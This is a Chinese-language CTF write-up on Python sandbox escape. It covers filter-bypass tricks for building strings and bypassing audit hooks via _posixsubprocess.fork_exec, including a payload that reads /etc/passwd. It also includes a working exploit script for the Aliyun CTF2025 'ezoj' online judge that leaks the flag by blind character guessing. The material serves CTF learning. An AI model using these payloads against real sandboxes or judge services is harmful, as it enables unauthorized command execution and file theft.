# 0x01 过滤 `引号
1. `str()`函数获取字符串，+索引
```bash
>>> ().__class__.__new__
<built-in method __new__ of type object at 0x9597e0>
>>> str(().__class__.__new__)
'<built-in method __new__ of type object at 0x9597e0>'
>>> str(().__class__.__new__)[21]
'w'
>>> str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]
'whoami'
```
2. `chr()`函数
```bash
>>> chr(56)
'8'
```
3. `list + dict `构造任意字符串
```python
list(dict(whoami=1))[0]
```
`dict`将式子转化为字典，`list`取出键位列表
4. `doc()`变量
__doc__ 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：
```python
().__doc__.find('s')
().__doc__[19]+().__doc__[86]+().__doc__[19]
```
# 0x02 过滤`+`
过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 join 函数，初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 `__doc__` 中取，

```python
str().join(().__doc__[19],().__doc__[23])
```

# 0x03 绕过基于 sys.addaudithook 的 audit hook
## 方法一
### \_\_loader\_\_.load_module导入模块

### \_posixsubprocess 执行命令
payload：
```python
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
```
## 3.2 [阿里云CTF2025]ezoj

题目就是一个oj，可以自己写脚本做计算题，做对了会给你检查
给了源码：
```python
import os
import subprocess
import uuid
import json
from flask import Flask, request, jsonify, send_file
from pathlib import Path

app = Flask(__name__)

SUBMISSIONS_PATH = Path("./submissions")
PROBLEMS_PATH = Path("./problems")

SUBMISSIONS_PATH.mkdir(parents=True, exist_ok=True)

CODE_TEMPLATE = """
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)


"""


class OJTimeLimitExceed(Exception):
    pass


class OJRuntimeError(Exception):
    pass


@app.route("/")
def index():
    return send_file("static/index.html")


@app.route("/source")
def source():
    return send_file("server.py")


@app.route("/api/problems")
def list_problems():
    problems_dir = PROBLEMS_PATH
    problems = []
    for problem in problems_dir.iterdir():
        problem_config_file = problem / "problem.json"
        if not problem_config_file.exists():
            continue

        problem_config = json.load(problem_config_file.open("r"))
        problem = {
            "problem_id": problem.name,
            "name": problem_config["name"],
            "description": problem_config["description"],
        }
        problems.append(problem)

    problems = sorted(problems, key=lambda x: x["problem_id"])

    problems = {"problems": problems}
    return jsonify(problems), 200


@app.route("/api/submit", methods=["POST"])
def submit_code():
    try:
        data = request.get_json()
        code = data.get("code")
        problem_id = data.get("problem_id")

        if code is None or problem_id is None:
            return (
                jsonify({"status": "ER", "message": "Missing 'code' or 'problem_id'"}),
                400,
            )

        problem_id = str(int(problem_id))
        problem_dir = PROBLEMS_PATH / problem_id
        if not problem_dir.exists():
            return (
                jsonify(
                    {"status": "ER", "message": f"Problem ID {problem_id} not found!"}
                ),
                404,
            )

        code_filename = SUBMISSIONS_PATH / f"submission_{uuid.uuid4()}.py"
        with open(code_filename, "w") as code_file:
            code = CODE_TEMPLATE + code
            code_file.write(code)

        result = judge(code_filename, problem_dir)

        code_filename.unlink()

        return jsonify(result)

    except Exception as e:
        return jsonify({"status": "ER", "message": str(e)}), 500


def judge(code_filename, problem_dir):
    test_files = sorted(problem_dir.glob("*.input"))
    total_tests = len(test_files)
    passed_tests = 0

    try:
        for test_file in test_files:
            input_file = test_file
            expected_output_file = problem_dir / f"{test_file.stem}.output"

            if not expected_output_file.exists():
                continue

            case_passed = run_code(code_filename, input_file, expected_output_file)

            if case_passed:
                passed_tests += 1

        if passed_tests == total_tests:
            return {"status": "AC", "message": f"Accepted"}
        else:
            return {
                "status": "WA",
                "message": f"Wrang Answer: pass({passed_tests}/{total_tests})",
            }
    except OJRuntimeError as e:
        return {"status": "RE", "message": f"Runtime Error: ret={e.args[0]}"}
    except OJTimeLimitExceed:
        return {"status": "TLE", "message": "Time Limit Exceed"}


def run_code(code_filename, input_file, expected_output_file):
    with open(input_file, "r") as infile, open(
        expected_output_file, "r"
    ) as expected_output:
        expected_output_content = expected_output.read().strip()

        process = subprocess.Popen(
            ["python3", code_filename],
            stdin=infile,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        try:
            stdout, stderr = process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            raise OJTimeLimitExceed

        if process.returncode != 0:
            raise OJRuntimeError(process.returncode)

        if stdout.strip() == expected_output_content:
            return True
        else:
            return False


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```
python沙箱逃逸
看到:
```python
CODE_TEMPLATE = """
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)


"""
```
这里时启用了审计钩子，只要是不在白名单的函数就会报错
这里算是好的给了我们import，但是无法执行命令，我这里也只知道一个方法：
https://xz.aliyun.com/news/12093
`_posixsubprocess 执行命令`

该模块的核心功能是 `fork_exec `函数:
`fork_exec` 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.

用法就是：
```python
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

所以这题的exp：
```python
import string
import requests

url = "http://121.41.238.106:63869/api/submit"
flag = ""

for i in range(0,50):
    for s in '-'+'}'+'{'+string.ascii_lowercase+string.digits:
        json = {"problem_id":"1","code":f"import os\nimport _posixsubprocess\n_posixsubprocess.fork_exec([b\"anything\", \"-c\",\"import os;f=os.popen('cat /f*').read();\\nif f[{i}]=='{s}':print(2)\"], [b\"/bin/python3\"], True, (), None, None, -1, -1, -1, -1, -1,-1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)\n"}
        res = requests.post(url, json=json)
        if res.json()['message'] == "Wrang Answer: pass(1/10)":
            flag += s
            print(flag)
            break
    print(i)
```
脚本的逻辑就是执行命令的时候，因为答案里面有2，所以你如果print(2)，那就会返回:
`Wrang Answer: pass(1/10)`
如果没有的话，那就一个都不对，就会返回
`Wrang Answer: pass(0/10)'
这里就是先绕过钩子读取到flag，然后一个个对比，如果对上了一个字符就`print(2)`，
这样进行布尔盲注。读取到flag